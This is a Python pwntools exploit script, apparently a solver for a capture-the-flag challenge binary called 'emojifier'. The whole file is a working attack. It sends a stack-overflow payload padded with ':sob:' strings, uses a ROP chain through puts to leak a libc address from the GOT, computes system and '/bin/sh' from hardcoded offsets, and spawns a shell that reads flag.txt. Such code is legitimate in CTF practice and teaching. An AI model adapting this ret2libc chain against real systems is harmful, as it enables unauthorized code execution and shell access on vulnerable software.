#!/usr/bin/env python3
from pwn import ELF, gdb, process, ROP, context, connect, u32, args, logging
from pathlib import Path


logging.disable()
exe = context.binary = ELF(Path(__file__).parent / "dist" / "emojifier")
host = args.HOST or 'localhost'
port = int(args.PORT or 10025)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


gdbscript = '''
tbreak main
continue
'''.format(**locals())

# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)


def leak_got_addr(io, function):
    io.recvlines(4)
    sob = b":sob:"
    rop = ROP([exe])
    rop.call(exe.sym['puts'], [exe.got[function]])
    rop.call(exe.sym['main'])
    payload = b'\x00' + sob*16 + b"CCCCCC" + b'B'*4 + rop.chain()
    io.sendline(payload)
    io.recvlines(4)
    addr = u32(io.recv(4))
    return addr


def ret2libc(io, system_addr, bin_sh):
    io.recvlines(5)
    sob = b":sob:"
    rop = ROP(exe)
    rop.call(system_addr, [bin_sh])
    payload = b'\x00' + sob*16 + b"CCCCCC" + b'B'*4 + rop.chain()
    io.sendline(payload)


def get_flag():
    io.recvlines(4)
    io.sendline(b'cat flag.txt')
    out = io.recv(10)
    return b"ifctf" in out


if __name__ == '__main__':
    io = start()
    puts_addr = leak_got_addr(io, 'puts')
    system_addr = puts_addr - 0x2b110
    bin_sh = puts_addr + 0x149e95
    ret2libc(io, system_addr, bin_sh)
    if get_flag():
        print("Got the flag!")
        exit(0)
    else:
        print("ERR - Flag not found running exp")
        exit(1)
